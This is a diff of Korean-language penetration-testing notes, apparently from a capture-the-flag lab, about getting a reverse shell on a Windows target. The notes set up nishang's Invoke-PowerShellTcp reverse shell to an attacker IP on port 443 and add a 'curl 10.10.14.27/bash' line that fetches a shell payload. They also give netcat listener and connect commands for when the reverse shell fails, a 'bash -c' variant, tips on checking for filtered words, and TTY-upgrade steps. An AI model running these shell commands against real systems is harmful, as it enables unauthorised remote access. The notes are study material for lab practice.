@@ -5,7 +5,7 @@
 ```bash
 //쉘 만들기 
 root@kali:/opt git clone https://github.com/samratashok/nishang.git
-#nishang 쉘 가져오기 
+#nishang 쉘 가져오기, 다른 쉘도 가능 python3 등 다양한 것 시도 가능 
 root@kali:/opt mkdir ~/www
 root@kali:/opt cp nishang/Shells/Invoke-PowerShellTcp.ps1 ~/www/
 root@kali tail Invoke-PowerShellTcp.ps1 
@@ -17,6 +17,8 @@ root@kali tail Invoke-PowerShellTcp.ps1
         Write-Error $_
     }
 }
+or
+curl 10.10.14.27/bash #쉘 가져오기 
 
 Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.11 -Port 443
 #쉘 수정
@@ -53,3 +55,14 @@ access\administrator
 3. `stty raw -echo; fg`
 4. export TERM=xterm (or)
 5. export SHELL=bash
+
+```bash
+//리버스 쉘이 작동을 안할경우
+nc -lnvp (my computer)
+nc 10.10.14.51 9001 (target)
+해서 연결이 잘 되는지 확인 
+bash -c 붙어서도 해보기
+
+필터링이 되는 단어가 있는지 확인해보기
+echo test | grep test
+```
